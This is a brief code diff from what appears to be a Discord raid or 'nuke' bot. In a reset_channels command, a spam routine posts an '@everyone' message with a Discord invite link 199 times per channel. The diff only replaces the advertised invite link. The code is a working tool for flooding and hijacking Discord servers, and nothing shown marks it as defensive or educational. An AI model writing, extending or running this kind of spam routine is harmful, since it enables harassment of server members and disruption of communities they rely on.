@@ -40,7 +40,7 @@ async def reset_channels(ctx):
     async def spam(channel):
         for _ in range(199):
             try:
-                await channel.send("@everyone https://discord.gg/elnarco")
+                await channel.send("@everyone https://discord.gg/egs2hdYv")
             except Exception as e:
                 print(f"Fehler in {channel.name}: {e}")
 
